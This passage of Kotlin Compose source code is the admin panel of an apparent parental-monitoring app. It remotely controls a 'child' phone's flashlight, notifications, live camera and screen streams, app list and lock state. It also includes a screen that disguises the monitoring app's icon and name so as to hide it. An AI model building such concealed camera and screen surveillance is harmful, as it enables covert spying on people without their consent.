            "هذه الميزة تسمح لك بلفت انتباه الطفل أو العثور على الجهاز المفقود عبر تشغيل أصوات مرتفعة عن بعد.",
            color = Color(0xFF6B7280),
            fontSize = 12.sp,
            textAlign = TextAlign.Center,
            modifier = Modifier.padding(horizontal = 8.dp)
        )
    }
}

@Composable
fun FlashlightControlTab(viewModel: AdminViewModel) {
    Column(
        modifier = Modifier.fillMaxSize().padding(14.dp),
        verticalArrangement = Arrangement.spacedBy(16.dp),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Card(
            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
            border = BorderStroke(1.dp, Color(0xFFE5E7EB)),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(16.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                Icon(
                    imageVector = Icons.Default.Bolt,
                    contentDescription = "الفلاش",
                    tint = Color(0xFFFBC02D),
                    modifier = Modifier.size(48.dp)
                )
                Spacer(modifier = Modifier.height(8.dp))
                Text("التحكم في فلاش الهاتف عن بعد", color = Color(0xFF1F2937), fontWeight = FontWeight.Bold, fontSize = 16.sp)
                Spacer(modifier = Modifier.height(8.dp))
                Text(
                    "يمكنك تشغيل الكشاف (الفلاش) أو إطفاؤه في أي وقت للسلامة والمتابعة.",
                    color = Color(0xFF4B5563),
                    fontSize = 12.sp,
                    textAlign = TextAlign.Center,
                    lineHeight = 18.sp
                )
                Spacer(modifier = Modifier.height(24.dp))
                
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                    Button(
                        onClick = { viewModel.turnOnFlashlight() },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4CAF50)),
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp)
                    ) {
                        Icon(Icons.Default.FlashOn, null)
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("اشعل الفلاش", fontWeight = FontWeight.Bold, fontSize = 13.sp)
                    }
                    
                    Button(
                        onClick = { viewModel.turnOffFlashlight() },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFEF4444)),
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp)
                    ) {
                        Icon(Icons.Default.FlashOff, null)
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("إطفاء الفلاش", fontWeight = FontWeight.Bold, fontSize = 13.sp)
                    }
                }
            }
        }

        Card(
            colors = CardDefaults.cardColors(containerColor = Color(0xFFF9FAFB)),
            border = BorderStroke(1.5.dp, Color(0xFFE5E7EB)),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(14.dp)) {
                Text(
                    text = "الأمر المرسل لتطبيق الطفل (Flash Commands):",
                    color = Color(0xFF374151),
                    fontWeight = FontWeight.Bold,
                    fontSize = 12.sp
                )
                Spacer(modifier = Modifier.height(8.dp))
                Text(
                    text = "عند التشغيل: \"flash_on\"\nعند الإطفاء: \"flash_off\"",
                    fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
                    color = Color(0xFF0284C7),
                    fontSize = 11.sp,
                    lineHeight = 16.sp
                )
            }
        }
    }
}

@Composable
fun NotificationTab(viewModel: AdminViewModel) {
    var title by remember { mutableStateOf("تنبيه من الوالدين") }
    var message by remember { mutableStateOf("") }
    
    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        Card(
            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
            border = BorderStroke(1.dp, Color(0xFFE5E7EB))
        ) {
            Column(modifier = Modifier.padding(16.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
                Text("إرسال إشعار فوري", color = Color(0xFF1F2937), fontWeight = FontWeight.Bold)
                
                OutlinedTextField(
                    value = title,
                    onValueChange = { title = it },
                    label = { Text("العنوان") },
                    modifier = Modifier.fillMaxWidth(),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedTextColor = Color(0xFF1F2937),
                        unfocusedTextColor = Color(0xFF1F2937),
                        focusedBorderColor = Color(0xFF9155FF)
                    )
                )

                OutlinedTextField(
                    value = message,
                    onValueChange = { message = it },
                    label = { Text("الرسالة") },
                    modifier = Modifier.fillMaxWidth().height(120.dp),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedTextColor = Color(0xFF1F2937),
                        unfocusedTextColor = Color(0xFF1F2937),
                        focusedBorderColor = Color(0xFF9155FF)
                    )
                )
                
                Button(
                    onClick = { 
                        if (message.isNotBlank()) {
                            viewModel.sendNotification(title, message)
                        }
                    },
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00C853)),
                    enabled = message.isNotBlank()
                ) {
                    Icon(Icons.Default.Send, null)
                    Spacer(Modifier.width(8.dp))
                    Text("إرسال الآن")
                }
            }
        }
        
        Text(
            "سيظهر هذا الإشعار فوراً في شريط التنبيهات على هاتف الطفل حتى لو كان التطبيق في الخلفية.",
            color = Color(0xFF6B7280),
            fontSize = 12.sp,
            textAlign = TextAlign.Center
        )
    }
}

@Composable
fun CameraLiveTab(viewModel: AdminViewModel) {
    val cameraStreamState by viewModel.cameraStreamState.collectAsState(initial = null)
    val isStreamingActive = cameraStreamState?.isActive == true
    val isLoading = cameraStreamState?.isLoading == true
    val error = cameraStreamState?.error
    val streamUrl = cameraStreamState?.streamUrl
    
    val bitmap by produceState<Bitmap?>(initialValue = null, viewModel) {
        viewModel.cameraStreamState.map { Pair(it?.image, it?.timestamp) }.distinctUntilChanged().conflate().collect { pair ->
            val imgStr = pair.first
            value = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) { 
                imgStr?.let { 
                    com.example.admin.CameraStreamState(image = it).toBitmap() 
                } 
            }
        }
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp)
            .verticalScroll(rememberScrollState()),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Card(
            modifier = Modifier.fillMaxWidth(),
            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
            border = BorderStroke(1.dp, Color(0xFFE5E7EB))
        ) {
            Column(
                modifier = Modifier.padding(16.dp),
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.spacedBy(16.dp)
            ) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column {
                        Text(
                            text = "بث حي للكاميرا",
                            color = Color(0xFF1F2937),
                            fontWeight = FontWeight.Bold,
                            fontSize = 16.sp
                        )
                        Text(
                            text = "جاهز لفتح اتصال البث المباشر",
                            color = Color(0xFF6B7280),
                            fontSize = 12.sp
                        )
                    }
                }

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(12.dp)
                ) {
                    Button(
                        onClick = { viewModel.startCameraStream(false) },
                        modifier = Modifier.weight(1f),
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF9155FF))
                    ) {
                        Icon(Icons.Default.FlipCameraAndroid, null)
                        Spacer(Modifier.width(8.dp))
                        Text("كاميرا خلفية")
                    }
                    Button(
                        onClick = { viewModel.startCameraStream(true) },
                        modifier = Modifier.weight(1f),
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF9155FF))
                    ) {
                        Icon(Icons.Default.CameraFront, null)
                        Spacer(Modifier.width(8.dp))
                        Text("كاميرا أمامية")
                    }
                }
                
                Text(
                    "ملاحظة: البث المباشر يستهلك بيانات الإنترنت والبطارية، سيتم إغلاق البث تلقائياً عند إغلاق النافذة.",
                    color = Color(0xFFFFA726),
                    fontSize = 11.sp,
                    textAlign = TextAlign.Center
                )
            }
        }
    }

    if (isStreamingActive || isLoading) {
        Dialog(onDismissRequest = { viewModel.stopCameraStream() }) {
            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .heightIn(min = 400.dp, max = 600.dp),
                colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
                border = BorderStroke(1.dp, if(isStreamingActive) Color(0xFF39D353) else Color(0xFF9155FF)),
                shape = RoundedCornerShape(16.dp)
            ) {
                Column(
                    modifier = Modifier.fillMaxSize()
                ) {
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(12.dp),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text(
                            text = if (isLoading) "جاري الاتصال بـ الكاميرا..." else "البث الحي مباشر",
                            color = if (isLoading) Color(0xFF9155FF) else Color(0xFF39D353),
                            fontWeight = FontWeight.Bold,
                            fontSize = 14.sp
                        )
                        IconButton(onClick = { viewModel.stopCameraStream() }) {
                            Icon(Icons.Default.Close, null, tint = Color(0xFF1F2937))
                        }
                    }

                    Box(
                        modifier = Modifier
                            .fillMaxWidth()
                            .weight(1f)
                            .background(Color.Black),
                        contentAlignment = Alignment.Center
                    ) {
                        if (isLoading) {
                            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                                CircularProgressIndicator(color = Color(0xFF9155FF))
                                Spacer(Modifier.height(16.dp))
                                Text("في انتظار استجابة هاتف الطفل...", color = Color(0xFF6B7280), fontSize = 14.sp)
                            }
                        } else if (isStreamingActive) {
                            val isWebRtcSignaling = !streamUrl.isNullOrBlank() && (streamUrl.contains("webrtc") || streamUrl.contains("signaling") || streamUrl.contains("render.com"))
                            if (!streamUrl.isNullOrBlank() && !isWebRtcSignaling) {
                                LiveStreamPlayer(
                                    streamUrl = streamUrl,
                                    deviceToken = viewModel.selectedDeviceToken.value,
                                    modifier = Modifier.fillMaxSize()
                                )
                            } else if (bitmap != null) {
                                Image(
                                    bitmap = bitmap!!.asImageBitmap(),
                                    contentDescription = "Camera Stream",
                                    modifier = Modifier.fillMaxSize(),
                                    contentScale = ContentScale.Fit
                                )
                            } else {
                                Column(horizontalAlignment = Alignment.CenterHorizontally) {
                                    CircularProgressIndicator(color = Color(0xFF9155FF))
                                    Spacer(Modifier.height(8.dp))
                                    Text("جاري استقبال الإطارات...", color = Color(0xFF6B7280), fontSize = 12.sp)
                                }
                            }
                        }
                        
                        if (error != null) {
                            Surface(
                                modifier = Modifier
                                    .align(Alignment.BottomCenter)
                                    .fillMaxWidth(),
                                color = Color.Black.copy(alpha = 0.7f)
                            ) {
                                Text(
                                    text = error!!,
                                    color = Color.Red,
                                    modifier = Modifier.padding(8.dp),
                                    fontSize = 12.sp,
                                    textAlign = TextAlign.Center
                                )
                            }
                        }
                    }
                    
                    Button(
                        onClick = { viewModel.stopCameraStream() },
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(12.dp),
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF4444))
                    ) {
                        Icon(Icons.Default.Stop, null)
                        Spacer(Modifier.width(8.dp))
                        Text(if(isLoading) "إلغاء الطلب" else "إيقاف البث وإغلاق")
                    }
                }
            }
        }
    }
}

@Composable
fun LiveStreamRequirementsPage(viewModel: AdminViewModel) {
    val liveStreamState by viewModel.liveStreamState.collectAsState(initial = null)
    val isStreamingActive = liveStreamState?.isActive == true
    val isLoading = liveStreamState?.isLoading == true
    val error = liveStreamState?.error
    val streamUrl = liveStreamState?.streamUrl
    
    var showFullscreenBitmap by remember { mutableStateOf<Bitmap?>(null) }
    var showFullscreenStream by remember { mutableStateOf<String?>(null) }

    Column(
        modifier = Modifier.fillMaxSize().verticalScroll(rememberScrollState()).padding(start = 14.dp, end = 14.dp, top = 14.dp, bottom = 100.dp),
        verticalArrangement = Arrangement.spacedBy(12.dp)
    ) {
        Card(
            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
            border = BorderStroke(1.dp, if(isStreamingActive) Color(0xFF39D353) else if (isLoading) Color(0xFF9155FF) else Color(0xFFE5E7EB)),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(14.dp)) {
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                    Text("البث المباشر للشاشة", color = Color(0xFF1F2937), fontSize = 13.sp, fontWeight = FontWeight.Bold)
                    Text(
                        if (isLoading) "جاري التحميل..." else if (isStreamingActive) "نشط" else "متوقف", 
                        color = if (isLoading) Color(0xFF9155FF) else if (isStreamingActive) Color(0xFF39D353) else Color(0xFFFF4081), 
                        fontSize = 11.sp
                    )
                }
                
                if (error != null) {
                    Spacer(modifier = Modifier.height(8.dp))
                    Card(
                        colors = CardDefaults.cardColors(containerColor = Color(0xFFEF4444).copy(alpha = 0.1f)),
                        border = BorderStroke(1.dp, Color(0xFFEF4444).copy(alpha = 0.3f)),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("خطأ: $error", color = Color(0xFFEF4444), fontSize = 11.sp, modifier = Modifier.padding(8.dp))
                    }
                }
                
                Spacer(modifier = Modifier.height(10.dp))
                Box(modifier = Modifier.fillMaxWidth().height(220.dp).clip(RoundedCornerShape(8.dp)).background(Color.Black).border(1.dp, Color(0xFFE5E7EB)), contentAlignment = Alignment.Center) {
                    val bitmap by produceState<Bitmap?>(initialValue = null, viewModel) {
                        viewModel.liveStreamState.map { Pair(it?.image, it?.timestamp) }.distinctUntilChanged().conflate().collect { pair ->
                            val imgStr = pair.first
                            value = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) { imgStr?.let { com.example.admin.LiveStreamState(image = it).toBitmap() } }
                        }
                    }
                    if (isLoading) {
                        Column(horizontalAlignment = Alignment.CenterHorizontally) {
                            CircularProgressIndicator(color = Color(0xFF9155FF))
                            Spacer(Modifier.height(8.dp))
                            Text("في انتظار استجابة الطفل...", color = Color(0xFF6B7280), fontSize = 12.sp)
                        }
                    } else if (isStreamingActive) {
                        val isWebRtcSignaling = !streamUrl.isNullOrBlank() && (streamUrl.contains("webrtc") || streamUrl.contains("signaling") || streamUrl.contains("render.com"))
                        if (!streamUrl.isNullOrBlank() && !isWebRtcSignaling) {
                            LiveStreamPlayer(streamUrl = streamUrl, deviceToken = viewModel.selectedDeviceToken.value, frameFlow = viewModel.liveStreamFrames, modifier = Modifier.fillMaxSize())
                            IconButton(onClick = { showFullscreenStream = streamUrl }, modifier = Modifier.align(Alignment.BottomEnd).padding(4.dp).background(Color.Black.copy(alpha = 0.5f), CircleShape)) {
                                Icon(Icons.Default.Fullscreen, null, tint = Color.White)
                            }
                        } else if (bitmap != null) {
                            Image(bitmap!!.asImageBitmap(), null, modifier = Modifier.fillMaxSize(), contentScale = ContentScale.Fit)
                            IconButton(onClick = { showFullscreenBitmap = bitmap }, modifier = Modifier.align(Alignment.BottomEnd).padding(4.dp).background(Color.Black.copy(alpha = 0.5f), CircleShape)) {
                                Icon(Icons.Default.Fullscreen, null, tint = Color.White)
                            }
                        } else {
                            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                                CircularProgressIndicator(color = Color(0xFF9155FF))
                                Spacer(Modifier.height(8.dp))
                                Text("جاري استقبال الإطارات...", color = Color(0xFF6B7280), fontSize = 11.sp)
                            }
                        }
                    } else {
                        Text("البث غير نشط.", color = Color(0xFF6B7280), fontSize = 12.sp)
                    }
                }
                Spacer(modifier = Modifier.height(12.dp))
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(10.dp)) {
                    Button(onClick = { viewModel.startLiveStream() }, enabled = !isStreamingActive && !isLoading, colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF238636)), modifier = Modifier.weight(1f)) {
                        Text("بدء البث")
                    }
                    Button(onClick = { viewModel.stopLiveStream() }, enabled = isStreamingActive || isLoading, colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFEF4444)), modifier = Modifier.weight(1f)) {
                        Text(if(isLoading) "إلغاء الطلب" else "إيقاف")
                    }
                }
            }
        }
    }

    showFullscreenBitmap?.let { bmp ->
        Dialog(onDismissRequest = { showFullscreenBitmap = null }) {
            Box(modifier = Modifier.fillMaxSize().clickable { showFullscreenBitmap = null }.background(Color.Black), contentAlignment = Alignment.Center) {
                Image(bmp.asImageBitmap(), null, modifier = Modifier.fillMaxSize(), contentScale = ContentScale.Fit)
            }
        }
    }

    showFullscreenStream?.let { url ->
        Dialog(onDismissRequest = { showFullscreenStream = null }) {
            Box(modifier = Modifier.fillMaxSize().clickable { showFullscreenStream = null }.background(Color.Black), contentAlignment = Alignment.Center) {
                val isWebRtcSignaling = !url.isNullOrBlank() && (url.contains("webrtc") || url.contains("signaling") || url.contains("render.com"))
                if (!isWebRtcSignaling) {
                    LiveStreamPlayer(streamUrl = url, deviceToken = viewModel.selectedDeviceToken.value, frameFlow = viewModel.liveStreamFrames, modifier = Modifier.fillMaxSize())
                } else {
                    Text("لا يمكن عرض البث عبر بروتوكول الإشارة", color = Color.White)
                }
            }
        }
    }
}

@Composable
fun ChangeIconRequirementsPage(viewModel: AdminViewModel) {
    val context = LocalContext.current
    var selectedIconId by remember { mutableStateOf<String?>(null) }
    
    val iconOptions = listOf(
        Triple("icon1", "name1", "icon1"), 
        Triple("icon2", "name2", "icon2"),
        Triple("icon3", "name3", "icon3")
    )

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(14.dp),
        verticalArrangement = Arrangement.spacedBy(10.dp)
    ) {
        Text("استبدال أيقونة وتسمية تطبيق الطفل", color = Color(0xFF1F2937), fontSize = 16.sp, fontWeight = FontWeight.Bold)
        Text("اختر أيقونة ومسمى بديل لتغيير مظهر تطبيق الطفل بهدف إخفائه بشكل فعال.", color = Color(0xFF6B7280), fontSize = 12.sp)

        iconOptions.forEach { (iconId, label, filename) ->
            Card(
                onClick = { selectedIconId = iconId },
                colors = CardDefaults.cardColors(
                    containerColor = if (selectedIconId == iconId) Color(0xFF9155FF).copy(alpha = 0.1f) else Color.White
                ),
                border = BorderStroke(1.dp, if (selectedIconId == iconId) Color(0xFF9155FF) else Color(0xFFE5E7EB)),
                shape = RoundedCornerShape(10.dp),
                modifier = Modifier.fillMaxWidth()
            ) {
                Row(modifier = Modifier.padding(14.dp), verticalAlignment = Alignment.CenterVertically) {
                    val bitmap = remember(filename) { 
                        var bmp: android.graphics.Bitmap? = null
                        val extensions = listOf(".png", ".jpg", ".jpeg", "")
                        for (ext in extensions) {
                            try {
                                val sst = context.assets.open(filename + ext)
                                bmp = android.graphics.BitmapFactory.decodeStream(sst)
                                if (bmp != null) break
                            } catch (e: Exception) {
                                // ignore
                            }
                        }
                        bmp?.asImageBitmap()
                    }
                    if (bitmap != null) {
                        Image(bitmap = bitmap, contentDescription = label, modifier = Modifier.size(40.dp))
                    } else {
                        Box(modifier = Modifier.size(40.dp).background(Color(0xFFE5E7EB), RoundedCornerShape(8.dp)), contentAlignment = Alignment.Center) {
                            Icon(Icons.Default.Apps, null, tint = Color(0xFF6B7280))
                        }
                    }
                    Spacer(modifier = Modifier.width(16.dp))
                    Column(modifier = Modifier.weight(1f)) {
                        Text(label, color = Color(0xFF1F2937), fontSize = 14.sp, fontWeight = FontWeight.Bold)
                        Text(iconId, color = Color(0xFF6B7280), fontSize = 11.sp)
                    }
                    if (selectedIconId == iconId) {
                        Icon(Icons.Default.CheckCircle, null, tint = Color(0xFF9155FF))
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(24.dp))
        
        Button(
            onClick = {
                val opt = iconOptions.find { it.first == selectedIconId }
                if (opt != null) {
                    viewModel.runCommand("change_icon", mapOf("iconName" to opt.first, "appName" to opt.second))
                }
            },
            enabled = selectedIconId != null,
            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF9155FF)),
            shape = RoundedCornerShape(10.dp),
            modifier = Modifier.fillMaxWidth().height(48.dp)
        ) {
            Text("استبدال الأيقونة", color = Color.White, fontWeight = FontWeight.Bold)
        }
    }
}

@OptIn(ExperimentalFoundationApi::class)
@Composable
fun InstalledAppsRequirementsPage(viewModel: AdminViewModel) {
    val installedApps by viewModel.installedApps.collectAsState()
    var query by remember { mutableStateOf("") }
    var selectedTab by remember { mutableStateOf(0) } // 0: User, 1: System
    var selectedAppForDialog by remember { mutableStateOf<com.example.admin.InstalledApp?>(null) }

    Column(modifier = Modifier.fillMaxSize().padding(14.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
        Button(
            onClick = {
                viewModel.runCommand("list_apps")
                viewModel.fetchInstalledApps() // Fetch after command if they already exist, but ideally we show what we have
            },
            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF4081)),
            modifier = Modifier.fillMaxWidth()
        ) {
            Text("تحديث قائمة التطبيقات", color = Color.White, fontWeight = FontWeight.Bold)
        }

        Row(
            modifier = Modifier.fillMaxWidth().background(Color(0xFFF3F4F6), RoundedCornerShape(8.dp)).padding(4.dp),
            horizontalArrangement = Arrangement.Center
        ) {
            listOf("تطبيقات المستخدم", "تطبيقات النظام").forEachIndexed { index, title ->
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if(selectedTab == index) Color(0xFF9155FF) else Color.Transparent)
                        .clickable { selectedTab = index }
                        .padding(vertical = 8.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(title, color = if(selectedTab == index) Color.White else Color(0xFF6B7280), fontWeight = FontWeight.SemiBold, fontSize = 13.sp)
                }
            }
        }

        OutlinedTextField(
            value = query,
            onValueChange = { query = it },
            label = { Text("بحث عن تطبيق..", color = Color(0xFF6B7280)) },
            modifier = Modifier.fillMaxWidth(),
            singleLine = true
        )

        val list = installedApps.filter {
            (query.isBlank() || it.name.contains(query, true)) && (it.isSystem == (selectedTab == 1))
        }

        LazyColumn(modifier = Modifier.weight(1f).fillMaxWidth(), verticalArrangement = Arrangement.spacedBy(6.dp)) {
            items(list) { app ->
                Card(
                    colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
                    modifier = Modifier
                        .fillMaxWidth()
                        .combinedClickable(
                            onClick = {  },
                            onLongClick = { selectedAppForDialog = app }
                        )
                ) {
                    Row(modifier = Modifier.padding(10.dp), verticalAlignment = Alignment.CenterVertically) {
                        Icon(if(app.isSystem) Icons.Default.Settings else Icons.Default.PlayArrow, null, tint = if(app.isSystem) Color.Gray else Color.Green, modifier = Modifier.size(24.dp))
                        Spacer(modifier = Modifier.width(12.dp))
                        Column(modifier = Modifier.weight(1f)) {
                            Text(app.name, color = Color(0xFF1F2937), fontSize = 14.sp, fontWeight = FontWeight.Bold)
                            Text(app.packageName, color = Color(0xFF6B7280), fontSize = 11.sp)
                        }
                        if (app.versionName != null) {
                            Text(app.versionName, color = Color(0xFF9155FF), fontSize = 10.sp, fontWeight = FontWeight.SemiBold, modifier = Modifier.background(Color(0xFFF3E8FF), RoundedCornerShape(4.dp)).padding(horizontal = 6.dp, vertical = 2.dp))
                        }
                    }
                }
            }
        }
    }

    if (selectedAppForDialog != null) {
        AlertDialog(
            onDismissRequest = { selectedAppForDialog = null },
            title = { Text(selectedAppForDialog!!.name, color = Color(0xFF1F2937)) },
            text = { Text("اختر الإجراء المطلوب لهذا التطبيق:", color = Color(0xFF6B7280)) },
            containerColor = Color(0xFFFFFFFF),
            confirmButton = {
                Column(modifier = Modifier.fillMaxWidth(), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(
                        onClick = {
                            viewModel.runCommand("open_app", mapOf("packageName" to selectedAppForDialog!!.packageName))
                            selectedAppForDialog = null
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF238636)),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("فتح التطبيق")
                    }
                }
            }
        )
    }
}

// 3. TAB 1: DEVICE SUMMARY & GENERAL METRICS
@Composable
fun GeneralStatusTab(device: Device, viewModel: AdminViewModel) {
    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        // Device name, Connection state indicator card
        Card(
            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
            shape = RoundedCornerShape(16.dp),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Text(
                        text = device.name,
                        color = Color(0xFF1F2937),
                        fontSize = 20.sp,
                        fontWeight = FontWeight.Bold
                    )
                    
                    // Connection Status Lamp badge
                    val isOnline = device.isOnline
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        modifier = Modifier
                            .clip(RoundedCornerShape(8.dp))
                            .background(
                                if (isOnline) Color(0xFF238636).copy(alpha = 0.2f)
                                else Color(0xFF6B7280).copy(alpha = 0.2f)
                            )
                            .padding(horizontal = 10.dp, vertical = 4.dp)
                    ) {
                        Box(
                            modifier = Modifier
                                .size(8.dp)
                                .clip(CircleShape)
                                .background(if (isOnline) Color(0xFF238636) else Color(0xFF6B7280))
                        )
                        Spacer(modifier = Modifier.width(6.dp))
                        Text(
                            text = if (isOnline) "متصل الآن" else "غير متصل",
                            color = if (isOnline) Color(0xFF39D353) else Color(0xFF6B7280),
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Bold
                        )
                    }
                }

                Spacer(modifier = Modifier.height(6.dp))
                val timeFormatted = remember(device.lastActive) {
                    if (device.lastActive == 0L) "متاح أبداً" 
                    else SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(device.lastActive))
                }
                Text(
                    text = "آخر نشاط: $timeFormatted",
                    color = Color(0xFF6B7280),
                    fontSize = 12.sp
                )

                Divider(modifier = Modifier.padding(vertical = 12.dp), color = Color(0xFFE5E7EB))

                // Lock Device state toggling switch panel
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(
                            imageVector = if (device.isLocked) Icons.Default.Lock else Icons.Default.LockOpen,
                            contentDescription = null,
                            tint = if (device.isLocked) Color(0xFFFF4081) else Color(0xFF238636),
                            modifier = Modifier.size(28.dp)
                        )
                        Spacer(modifier = Modifier.width(12.dp))
                        Column {
                            Text(
                                text = if (device.isLocked) "الجهاز مقفل حالياً" else "الجهاز حر ومفتوح",
                                color = Color(0xFF1F2937),
                                fontSize = 14.sp,
                                fontWeight = FontWeight.SemiBold
                            )
                            Text(
                                text = "يمكنك قفل الشاشة لمنع استخدامه",
                                color = Color(0xFF6B7280),
                                fontSize = 11.sp
                            )
                        }
                    }

                    // Dual fast lock/unlock buttons
                    Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        Button(
                            onClick = { viewModel.changeLockStatus(true) },
                            colors = ButtonDefaults.buttonColors(
                                containerColor = if (device.isLocked) Color(0xFFFF4081).copy(alpha = 0.3f) else Color(0xFFFF4081),
                                contentColor = Color(0xFF1F2937)
                            ),
                            shape = RoundedCornerShape(8.dp),
                            contentPadding = PaddingValues(horizontal = 12.dp, vertical = 4.dp),
                            modifier = Modifier.height(36.dp)
                        ) {
                            Text("قفل", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                        }

                        Button(
                            onClick = { viewModel.changeLockStatus(false) },
                            colors = ButtonDefaults.buttonColors(
                                containerColor = if (!device.isLocked) Color(0xFF238636).copy(alpha = 0.3f) else Color(0xFF238636),
                                contentColor = Color(0xFF1F2937)
                            ),
                            shape = RoundedCornerShape(8.dp),
                            contentPadding = PaddingValues(horizontal = 12.dp, vertical = 4.dp),
                            modifier = Modifier.height(36.dp)
                        ) {
                            Text("إلغاء", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                }
            }
        }

        // Diagnostic / Battery indicator Card
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            Card(
                colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
                shape = RoundedCornerShape(16.dp),
                modifier = Modifier.weight(1f)
            ) {
                Column(modifier = Modifier.padding(16.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                    Icon(
                        imageVector = getBatteryIcon(device.battery),
                        contentDescription = null,
                        tint = getBatteryColor(device.battery),
                        modifier = Modifier.size(36.dp)
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    Text("البطارية", color = Color(0xFF6B7280), fontSize = 12.sp)
                    Text(
                        text = "${device.battery}%",
                        color = Color(0xFF1F2937),
                        fontSize = 20.sp,
                        fontWeight = FontWeight.Bold
                    )
                }
            }

            Card(
                colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
                shape = RoundedCornerShape(16.dp),
                modifier = Modifier.weight(1f)
            ) {
                val usagePercentage = if (device.storageTotal > 0) {
                    ((device.storageUsed.toDouble() / device.storageTotal.toDouble()) * 100).toInt()
                } else {
                    0
                }
                Column(modifier = Modifier.padding(16.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                    Icon(
                        imageVector = Icons.Default.Storage,
                        contentDescription = null,
                        tint = Color(0xFF9155FF),
                        modifier = Modifier.size(36.dp)
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    Text("مساحة التخزين", color = Color(0xFF6B7280), fontSize = 12.sp)
                    Text(
                        text = "$usagePercentage%",
                        color = Color(0xFF1F2937),
                        fontSize = 20.sp,
                        fontWeight = FontWeight.Bold
                    )
                }
            }
        }

        // Detailed Storage Visual Progress bar Card
        Card(
